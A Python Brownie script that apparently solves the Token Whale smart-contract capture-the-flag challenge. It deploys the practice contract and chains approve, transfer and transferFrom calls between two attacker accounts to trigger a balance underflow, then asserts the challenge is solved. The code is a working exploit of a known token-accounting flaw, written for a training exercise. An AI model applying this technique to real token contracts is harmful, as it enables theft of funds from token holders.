#!/usr/bin/python3
from brownie import interface, web3
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{True}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, _, attacker1, attacker2 = deploy()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    target = interface.TokenWhaleChallengeInterface(target.address)

    print_colour(target.isComplete())

    # approve 1st account from the 2nd account
    target.approve(attacker1.address, 1000, {"from": attacker2}).wait(1)

    print(f"Attacker1 balance: {target.balanceOf(attacker1.address)}")
    print(f"Attacker2 balance: {target.balanceOf(attacker2.address)}")

    # send money to the 2nd account
    target.transfer(attacker2.address, 501, {"from": attacker1}).wait(1)

    print(f"Attacker1 balance: {target.balanceOf(attacker1.address)}")
    print(f"Attacker2 balance: {target.balanceOf(attacker2.address)}")

    # * call the transferFrom fn. which doesn't have the check for msg.sender
    # ? transferFrom(from, to, amount)
    target.transferFrom(
        attacker2.address,
        "0x0000000000000000000000000000000000000000",
        500,
        {"from": attacker1},
    ).wait(1)

    print(f"Attacker1 balance: {target.balanceOf(attacker1.address)}")
    print(f"Attacker2 balance: {target.balanceOf(attacker2.address)}")

    print_colour(target.isComplete())

    assert target.isComplete() == True


def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()


if __name__ == "__main__":
    main()
